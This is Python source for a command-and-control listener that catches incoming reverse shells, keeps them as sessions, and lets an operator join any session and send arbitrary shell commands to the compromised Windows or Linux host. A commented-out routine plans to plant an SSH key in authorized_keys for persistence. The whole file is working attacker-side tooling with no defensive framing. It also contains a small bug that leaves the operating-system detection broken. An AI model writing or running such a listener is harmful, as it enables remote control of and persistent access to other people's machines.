import socket
import os
import platform
import threading
import logging
import sys
import time

logging.basicConfig(filename='./c2-log.txt', level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s\n')

THREAD_COUNT = 10
sessions = []
session_lock = threading.Lock()

class Session():
    def __init__(self, socket, address):
        self.socket, self.address = socket,address

    def cmd_session(self):
        print("Session joined!\n\n")
        logging.info(f"Session {self.address} joined!")
        operating_system = 'linux'
        self.socket.send('\r\n'.encode())
        
        response = self.socket.recv(4096).decode('utf-8')

        if "PS" == response[0:1] or "C:\\" == response[0:3]:
            operating_system == "windows"
            
        sys.stdout.write(f"{response}")       

        while True:
            
            command = input()
            try:
                if command.lower() == "exit":
                    if operating_system != 'linux':
                        command = 'exit\r\n'
                    else:
                        command = 'exit\n'
                    self.socket.send(command.encode("utf-8"))
                    self.socket.close()
                    break

                elif command.lower() == "clear":
                    if operating_system != "linux":
                        command = '\r\n'
                    else:
                        command = '\n'
                    self.socket.send(command.encode("utf-8"))
                    os.system("clear")
                
                elif command.lower() == "shelp":
                    print("\nShell Help:")
                    print("clear - Clears terminal contents")
                    print("sw - Print the current user")
                    print("bg - Sends current shell session to the background\n")
                    command = ""
                    if operating_system != 'linux':
                        command += '\r\n'
                    else:
                        command += '\n'
                    self.socket.send(command.encode('utf-8'))
                    time.sleep(1)
                
                # elif command.lower() == "ssh-inject":
                #     print("Attempting to inject ssh pubkey!")
                #     opt = int("Select Option (1: Use generated key | 2: Generate new key): ")

                #     if platform.system() == "Windows":
                #         home_dir = r"C:\\Users\\"
                #     else:
                #         home_dir = "~/"

                #     if opt == 1:
                #         for folder, subfolder, files in os.walk(home_dir):
                #             if folder == '.ssh':
                #                 for idx, file in enumerate(files, start=1):
                #                    print(f"{idx}: {file}")
                #         key_select = int(input("Enter number: "))

                        

                #         command = 'echo "" >> authorized_keys'
                #         if operating_system != 'linux':
                #             command += '\r\n'
                #         else:
                #             command += '\n'
                #         self.socket.send(command.encode('utf-8'))
                #         time.sleep(1)
                        

                #     elif opt == 2:
                #         os.system("ssh-keygen")
                #         print("Key generated!")


                #     else:
                #         print("Invalid command...")

                    
                #     command = ""
                #     if operating_system != 'linux':
                #         command += '\r\n'
                #     else:
                #         command += '\n'
                #     self.socket.send(command.encode('utf-8'))
                #     time.sleep(1)

                elif command.lower() == "bg":
                    print("Sending shell to background!")
                    command = ""
                    if operating_system != 'linux':
                        command += '\r\n'
                    else:
                        command += '\n'
                    self.socket.send(command.encode('utf-8'))
                    time.sleep(1)
                    return

                else:
                    if operating_system != 'linux':
                        command += '\r\n'
                    else:
                        command += '\n'
                    self.socket.send(command.encode('utf-8'))
                    time.sleep(1)

                response = self.socket.recv(4096).decode('utf-8')
                
                sys.stdout.write(response)
            
            except Exception as e:
                logging.error(f"Error: {e}")
            
    def __str__(self):
        return f"{self.address}"

def listen_for_socket(host, port):
    logging.info(f"[ $$$ ] Listening on {host}:{port} [ $$$ ]")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host,port))
    server.listen()
    
    sock, addr = server.accept()
    logging.info(f"[ ;-) ] Connection successful from {addr} [ (-; ]")

    return sock, addr

def handle_client_conn(host, port, sessions):
    try:
        target_socket, target_address = listen_for_socket(host, port)
        ns = Session(target_socket,target_address)
        sessions.append(ns)
        logging.info(f"New session established: {ns}")
    except Exception as e:
        logging.error(f"Error handling client connection: {e}")

def main():
    threads = []
    logging.info("Starting C2-Listener!")
    
    while True:

        try:
            option = int(input("\nEnter option: "))

            if option == 1:

                try:
                    host = str(input("Enter IP (0.0.0.0 by default): ")) or "0.0.0.0"

                    if host == "":
                        host = "0.0.0.0"

                    port = int(input("Enter port: "))
            
                    nt = threading.Thread(target=handle_client_conn, args=(host, port, sessions), daemon=True)
                    threads.append(nt)
                    nt.start()
                    
                except Exception as e:
                    logging.error(f"Error: {e}")
                    pass

            elif option == 2:
                with session_lock:
                    if len(sessions) > 0:
                        print()
                        for idx, session in enumerate(sessions, start=1):
                            print(f"\tSession {idx}: {str(session)}\n")
                            
                        try:
                            session_select = int(input("Enter session number to join: "))
                            
                            logging.info(f"Joining session {session_select}!")

                            sessions[session_select - 1].cmd_session()
                            logging.info(f"Exiting session {session_select}!")
                        
                        except Exception as e:
                            logging.error("Session has been closed or is non-existent...")
                            print("Session is no longer active or doesn't exist...")
                            sessions.pop(session_select - 1)
                            pass
                    
                    else:
                        logging.info("No sessions established...")
                        print("No sessions established...")

            elif option == 3:
                logging.info("Exiting C2-Listener...")
                break
            else:
                logging.error(f"Invalid option...")
        except Exception as e:
            logging.error(f"Unexpected Error: {e}")

    print("Exiting C2-Listener!")      

if __name__ == "__main__":
    main()